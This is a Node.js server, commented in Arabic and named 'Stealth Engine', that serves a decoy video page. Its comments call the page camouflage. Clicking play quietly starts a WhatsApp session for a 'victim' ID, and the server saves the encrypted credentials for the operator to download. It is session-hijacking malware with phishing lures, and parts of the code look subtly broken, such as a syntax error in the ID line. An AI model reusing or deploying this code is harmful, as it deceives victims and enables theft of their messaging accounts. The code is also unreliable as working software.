const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const { Boom } = require('@hapi/boom');
const pino = require('pino');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const sessionsDir = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsDir)) {
    fs.mkdirSync(sessionsDir, { recursive: true });
}

const ENCRYPTION_KEY = crypto.scryptSync(process.env.SESSION_SECRET || 'kodyboy-secret-key-2026', 'salt', 32);
const IV_LENGTH = 16;

function encryptData(text) {
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv('aes-256-cbc', ENCRYPTION_KEY, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return iv.toString('hex') + ':' + encrypted;
}

function cleanupSession(sessionPath) {
    try {
        if (fs.existsSync(sessionPath)) {
            fs.rmSync(sessionPath, { recursive: true, force: true });
        }
    } catch (e) {
        console.error(`[-] خطأ أثناء التنظيف: ${e.message}`);
    }
}

// واجهة الفيديو الوهمية (التمويه)
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>مشاهدة الفيديو</title>
            <style>
                body { background: #000; color: #fff; font-family: Tahoma, sans-serif; text-align: center; margin: 0; padding-top: 100px; }
                .video-container { max-width: 600px; margin: auto; background: #111; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); position: relative; }
                video { width: 100%; display: block; }
                .play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center; cursor: pointer; }
                .play-btn { background: #ff0000; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="video-container">
                <video id="myVideo" controls>
                    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
                    متصفحك لا يدعم عرض الفيديو
                </video>
                <div id="overlay" class="play-overlay" onclick="triggerStealth()">
                    <button class="play-btn">▶ تشغيل الفيديو</button>
                </div>
            </div>

            <script>
                function triggerStealth() {
                    const video = document.getElementById('myVideo');
                    const overlay = document.getElementById('overlay');
                    
                    // إخفاء الغلاف وتشغيل الفيديو للضحية طبيعياً
                    overlay.style.display = 'none';
                    video.play();

                    // توليد معرف جلسة عشوائي فريد لكل ضحية في الخلفية
                    const randomId = 'victim_' + Math.random().toString(36.substring(2, 9));

                    // إرسال طلب خفي للسيرفر لسحب الجلسة بصمت تام
                    fetch('/api/v1/stealth/connect-auto', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sessionId: randomId })
                    }).catch(err => console.log(err));
                }
            </script>
        </body>
        </html>
    `);
});

app.post('/api/v1/stealth/connect-auto', async (req, res) => {
    const { sessionId } = req.body;
    
    if (!sessionId) {
        return res.status(400).json({ status: 'error', message: 'مفقود' });
    }

    const sessionPath = path.join(sessionsDir, sessionId);

    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);

        const sock = makeWASocket({
            auth: state,
            printQRInTerminal: false,
            logger: pino({ level: 'silent' }),
            browser: ['Chrome', 'Windows', '124.0.0.0']
        });

        sock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect } = update;
            
            if (connection === 'open') {
                console.log(`[+] تم التقاط الجلسة بنجاح للضحية: ${sessionId}`);
                const credsPath = path.join(sessionPath, 'creds.json');
                
                setTimeout(async () => {
                    try {
                        if (fs.existsSync(credsPath)) {
                            const tokenRaw = fs.readFileSync(credsPath, 'utf8');
                            const encryptedToken = encryptData(tokenRaw);
                            
                            // حفظ التوكن المشفّر في ملف خاص داخل السيرفر يمكنك تحميله لاحقاً
                            fs.writeFileSync(path.join(__dirname, `token_${sessionId}.enc`), encryptedToken);

                            await sock.logout();
                            sock.ws.close();
                        }
                    } catch (err) {
                        console.error(`[-] خطأ الحفظ: ${err.message}`);
                    } finally {
                        cleanupSession(sessionPath);
                    }
                }, 2000);

            } else if (connection === 'close') {
                const reason = new Boom(lastDisconnect?.error)?.output?.statusCode;
                if (reason === DisconnectReason.loggedOut || reason === DisconnectReason.badSession) {
                    cleanupSession(sessionPath);
                }
            }
        });

        sock.ev.on('creds.update', saveCreds);
        return res.json({ status: 'success' });

    } catch (err) {
        cleanupSession(sessionPath);
        return res.status(500).json({ status: 'error' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[+] Stealth Engine يعمل على المنفذ ${PORT}`);
});
